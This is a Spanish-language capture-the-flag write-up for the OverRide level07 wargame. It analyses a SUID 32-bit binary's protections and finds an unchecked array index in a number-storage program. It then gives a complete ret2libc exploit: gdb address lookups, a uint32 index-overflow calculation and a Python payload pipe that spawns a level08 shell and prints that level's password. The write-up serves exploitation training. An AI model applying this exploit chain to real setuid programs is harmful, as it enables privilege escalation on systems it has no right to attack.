# 1. Buscar Binario:

Listamos los archivos para que muestre el biarnio del `level06` y sus permisos:

```bash
level07@OverRide:~$ ls -la
total 21
dr-xr-x---+ 1 level07 level07    80 Sep 13  2016 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
-rw-r--r--  1 level07 level07   220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level07 level07  3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07
-rw-r--r--+ 1 level07 level07    41 Oct 19  2016 .pass
-rw-r--r--  1 level07 level07   675 Sep 10  2016 .profile
```

> **Nota:** El bit `s` en los permisos indica que es un binairo **SUID**. Se ejecuta con los privilegios del propietario (`level08`).

# 2. Analizamos las protecciones de la RAM
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

### a). PIE:
```bash
level07@OverRide:~$ file ./level07 
./level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf5b46cdb878d5a3929cc27efbda825294de5661e, not stripped
```

## b). ASLR:
```bash
level05OverRide:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level07@OverRide:~$ readelf -l ./level07 | grep -E "RELRO|STACK"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
  GNU_RELRO      0x001f14 0x08049f14 0x08049f14 0x000ec 0x000ec R   0x1
```

### d). STACK CANARY:
```bash
level07@OverRide:~$ nm ./level07 
08049f28 d _DYNAMIC
08049ff4 d _GLOBAL_OFFSET_TABLE_
08048acc R _IO_stdin_used
         w _Jv_RegisterClasses
08049f18 d __CTOR_END__
08049f14 d __CTOR_LIST__
08049f20 D __DTOR_END__
08049f1c d __DTOR_LIST__
08048f78 r __FRAME_END__
08049f24 d __JCR_END__
08049f24 d __JCR_LIST__
0804a030 A __bss_start
0804a028 D __data_start
08048a80 t __do_global_ctors_aux
08048540 t __do_global_dtors_aux
0804a02c D __dso_handle
         w __gmon_start__
08048a72 T __i686.get_pc_thunk.bx
08049f14 d __init_array_end
08049f14 d __init_array_start
         U __isoc99_scanf@@GLIBC_2.7
08048a70 T __libc_csu_fini
08048a00 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
         U __stack_chk_fail@@GLIBC_2.4      ⟸
0804a030 A _edata
0804a06c A _end
08048aac T _fini
08048ac8 R _fp_hw
0804842c T _init
08048510 T _start
080485c4 T clear_stdin
0804a064 b completed.6159
0804a028 W data_start
0804a068 b dtor_idx.6161
         U fflush@@GLIBC_2.0
         U fgets@@GLIBC_2.0
080485a0 t frame_dummy
080485e7 T get_unum
         U getchar@@GLIBC_2.0
08048723 T main
         U memset@@GLIBC_2.0
         U printf@@GLIBC_2.0
0804861f T prog_timeout
         U puts@@GLIBC_2.0
080486d7 T read_number
0804a040 B stdin@@GLIBC_2.0
0804a060 B stdout@@GLIBC_2.0
08048630 T store_number
```

### e). `.got` y `.plt`:
```bash
level07@OverRide:~$  readelf -S ./level07 | grep -E ".got|.plt"
  [10] .rel.plt          REL             080483dc 0003dc 000050 08   A  5  12  4
  [12] .plt              PROGBITS        08048460 000460 0000b0 04  AX  0   0 16
  [22] .got              PROGBITS        08049ff0 001ff0 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049ff4 001ff4 000034 04  WA  0   0  4
```

---

# 3. Resumen del análisis:

**IMPORTANTE**:
Estamos ante un Binario de `32 bits` tal y como nos muestra `file ./level07`

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000`. |
| **ASLR** | **OFF** | `0` | El Heap y el Stack no se mueven; las direcciones son fijas. |
| **NX** | **OFF** | `RWE` | El Stack **SÍ** permite ejecución. Podemos meter y correr Shellcode allí. |
| **RELRO** | **PARTIAL** | `R` | La sección `.got.plt` sigue siendo escribible `(WA)`. |
| **CANARY** | **SÍ** | `__stack_chk_fail@@GLIBC_2.4` ⟸ | Hay "centinela" al final del stack. Si desbordamos el buffer el programa lo detectará y abortará. |
| **.got.plt** | **WA** | `WA` | Confirma sección `.got.plt` en escritura. |

---

# 4. Fuzzing:

Al ejecutar el binario el programa nos muestra la cabecera de un programa que acepta comandos preestablecidos para interactuar con una base de datos:

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------
Input command: quit
```

Probamos a ver cómo funciona: Guardamos un número y lo leemos:

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 12
 Index: 5
 Completed store command successfully
Input command: read
 Index: 5
 Number at data[5] is 12
 Completed read command successfully
Input command: quit
level07@OverRide:~$ 
```

Descubrimos que hay índices reservados que no podemos escribir:

```bash
Input command: store
 Number: 12
 Index: 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

Probamos índices grandes para ver si hay límite:

```bash
Input command: store
 Number: 12
 Index: 10000
Segmentation fault (core dumped)
```

No hay límite en el índice. Con índices suficientemente grandes el programa crashea por segfault. Esto confirma que podemos escribir fuera del array `data` y sobrescribir zonas arbitrarias de memoria.
Esto es un **Array Out of Bounds** — vector directo de explotación.

---

# 5. Reverse Engineering (Target Identification):

El comando `nm` nos muestra funciones importantes:

```bash
08048723 T main           ⟸
08048630 T store_number   ⟸
080486d7 T read_number    ⟸
         U memset@@GLIBC_2.0         ⟸
         U __stack_chk_fail@@GLIBC_2.4 ⟸
```

* `store_number()` y `read_number()`: Funciones propias del binario que
  gestionan el almacenamiento y lectura de números en el array `data`.
* `memset()`: El array `data` se inicializa a ceros al inicio.
* `__stack_chk_fail()`: Hay Stack Canary — no podemos desbordar el buffer directamente.

**Importante:** No hay `system()` en el binario. Sin embargo el array no tiene límite de índice — podemos escribir en cualquier dirección de memoria calculando el offset correcto desde `data`. Combinado con NX OFF, podemos usar esta vulnerabilidad para sobrescribir el EIP o la `.got.plt`.

Para ver con detalle el análisis consulta el archivo
[asm_analysis.md](https://github.com/4trastos/OverRide/blob/main/level07/Resources/README.md)
en conjunto con el programa de demostración
[source.c](https://github.com/4trastos/OverRide/blob/main/level07/source.c).

---

# 6. Solución:

Para resolver este nivel usamos **Ret2Libc** — el programa borra `argv` y `envp` al inicio impidiendo usar variables de entorno para shellcode, pero podemos escribir fuera del array `data` para sobrescribir el `EIP` de `main`.

---

## 1. Localizar las direcciones necesarias:

```bash
(gdb) b *0x08048636
(gdb) r
Input command: store
Breakpoint 1, 0x08048636 in store_number ()
(gdb) x $ebp+0x8
0xffffd400:    0xffffd424    ← dirección base de data
```

```bash
(gdb) b *0x080489f1
(gdb) c
quit
Breakpoint 2, 0x080489f1 in main ()
(gdb) x/wx $esp
0xffffd5c8:    0xf7e45513    ← dirección del EIP de main
```

```bash
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec    → 4160264172
(gdb) p system
0xf7e6aed0    → 4159090384
```

---

## 2. Calcular el índice del EIP:

```
data base:  0xffffd424
EIP:        0xffffd5c8
offset:     (0xffffd5c8 - 0xffffd424) / 4 = 456 / 4 = 114
```

Como `114 % 3 == 0` está bloqueado — hacemos overflow del `uint32`:

```
0xffffffff / 4 + 114 + 1 = 1073741938
1073741938 % 3 = 1  ✓
```

---

## 3. Construcción del payload:

Necesitamos escribir dos valores:
- `system()` en el EIP — índice `1073741938`
- `"/bin/sh"` en EIP+4 (argumento de `system`) — índice `116`

---

## 4. Ejecución:

```bash
level07@OverRide:~$ (python -c "
print 'store'
print '4160264172'
print '116'
print 'store'
print '4159090384'
print '1073741938'
print 'quit'
"; cat) | ./level07
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$
```

---

# 7. Conclusión:

El nivel 07 introduce la vulnerabilidad **Array Out of Bounds** — el array `data` no tiene límite superior y podemos escribir en cualquier dirección de memoria calculando el offset correcto. El programa borra `argv` y `envp` al inicio para impedir el uso de variables de entorno, y tiene Stack Canary para impedir el desbordamiento clásico del buffer.

La solución es usar **Ret2Libc** calculando el índice que apunta al `EIP` de `main` desde la base del array. Como el índice calculado es múltiplo de 3 y está bloqueado, se hace un overflow del `uint32` para obtener un índice equivalente que no sea múltiplo de 3.

---
